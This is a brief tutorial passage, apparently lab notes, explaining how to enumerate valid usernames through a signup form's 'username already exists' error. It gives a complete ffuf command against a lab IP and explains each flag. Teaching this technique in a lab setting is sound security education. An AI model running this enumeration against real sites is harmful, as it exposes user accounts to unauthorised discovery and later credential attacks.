To find authentication vulnerabilities, create a list of valid usernames by exploiting error messages from the signup form. By entering common usernames and observing the errors like `username already exists,` you can identify existing accounts. 

Ffuf automate this process by testing multiple usernames and collecting matches.
```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.36.56/customers/signup -mr "username already exists"
```
- `-w:` wordlist to use for fuzzing
- `-X POST:` Instructs ffuf to send HTTP POST requests (common for signup or login forms).
- `-d:` data to be sent in the POST request.
- `FUZZ:` is a placeholder replaced by each word from the wordlist
- `"username=FUZZ&email=x&password=x&cpassword=x":` simulates a typical signup request.
- `-H "Content-Type: application/x-www-form-urlencoded":` adds an HTTP header
- `-u:` targets the signup endpoint
- `-mr:` match response